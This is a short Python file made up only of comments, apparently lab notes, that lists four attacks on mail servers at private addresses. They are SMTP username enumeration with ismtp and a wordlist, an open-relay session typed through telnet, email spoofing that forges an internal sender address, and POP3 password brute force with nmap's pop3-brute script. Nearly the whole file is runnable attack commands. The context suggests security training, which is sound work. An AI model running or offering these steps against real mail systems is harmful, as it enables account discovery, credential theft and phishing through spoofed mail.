#!/usr/bin/env python

# Attack 1: username enumeration attack
# $ ismtp -h 192.16.1.11:25 -e /usr/share/wordlists/metasploit/ismtp_test.txt -l 2

# Attack 2: open relay attack
# telnet 172.16.0.116 25  [telnet to the relay server]
# HELO 172.16.0.116    [tell the remote server of the client]
# **********  [system auto reply]
# MAIL FROM:<dummy@172.16.0.116> [indicate sender address]
# **********
# RCPT TO:<shanz@172.16.0.153> [indicate receiver address]
# **********
# DATA [indicate the following content is data]
# **********
# Subject:hi sansan [email content body]
# This is a sample message. 
# .
# **********
# QUIT [finished sending]

# Attack 3: email spoofing attack 
# telnet 172.16.107.136 25  [telnet to the remote server outside of organization]
# HELO 172.16.107.136    [tell the remote server of the client address ]
# **********  [system auto reply]
# MAIL FROM:<dummy@172.16.0.116> [indicate sender address and this email would look like sending from inside the organization]
# **********
# RCPT TO:<stern@172.16.0.146> [indicate receiver address]
# **********
# DATA [indicate the following content is data]
# **********
# Hey, [email content body]
# This is a sample message. 
# .
# **********
# QUIT [finished sending]

# Attck 4: brute-force dictionary attack
# sudo nmap -p110 --script pop3-brute 172.16.0.146

